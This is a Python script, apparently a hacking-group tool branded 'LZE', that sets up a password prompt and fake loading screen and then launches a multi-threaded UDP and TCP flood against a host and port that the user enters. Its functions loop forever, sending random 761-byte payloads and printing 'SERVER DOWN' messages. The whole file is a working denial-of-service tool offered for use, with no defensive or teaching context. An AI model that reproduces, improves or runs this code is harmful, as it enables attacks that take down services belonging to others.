import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os, socket, threading, colorsys, time, random
import socket
import sys
import os
import time
import random
import threading
import base64 as b64
from types import MethodType
import string
import json
import sys

pasw = "LZE"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[0] Loading.......")
        time.sleep(1)
        print("[10] Loading......")
        time.sleep(1)
        print("[20] Loading.......")
        time.sleep(1)
        print("[30] Loading.......")
        time.sleep(1)
        print("[40] Loading.......")
        time.sleep(1)
        print("[50] Loading.......")
        time.sleep(1)
        print("[60] Loading.......")
        time.sleep(1)
        print("[70] Loading.......")
        time.sleep(1)
        print("[80] Loading.......")
        time.sleep(1)
        print("[90] Loading.......")
        time.sleep(1)
        print("[100] Processing\n")
        time.sleep(3)
        break
    else:
        time.sleep(2)
        print("[x] Wrong Password \n")
        continue
time.sleep(2)
print("Succesfull Logins")
time.sleep(2)

os.system("clear")
print("""

\033[36m _     __________   _   _  ___    ____   ____    _    ____  _____ 
\033[36m| |   |__  / ____| | \ | |/ _ \  / ___| / ___|  / \  |  _ \| ____|
\033[36m| |     / /|  _|   |  \| | | | | \___ \| |     / _ \ | |_) |  _|  
\033[36m| |___ / /_| |___  | |\  | |_| |  ___) | |___ / ___ \|  _ <| |___ 
\033[36m|_____/____|_____| |_| \_|\___/  |____/ \____/_/   \_\_| \_\_____|               
LZE""")
print("\033[32m━━━ Yakin? (y/n)")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[38m━━━ Host/IP")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[32m━━━ Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[37m━━━ Pakets")	
print("\033[32m━━━ Min Pakets 100")
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[34m━━━ Threads")
print("\033[30m━━━ Min Threads 100")
threads = int(input("┗━━━━━━>\033[0m:"))
def xxxx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> Bakekok \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> BAKEKOK \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> BAKEKOK \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

def x():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> SERVER DOWN \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
  else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()
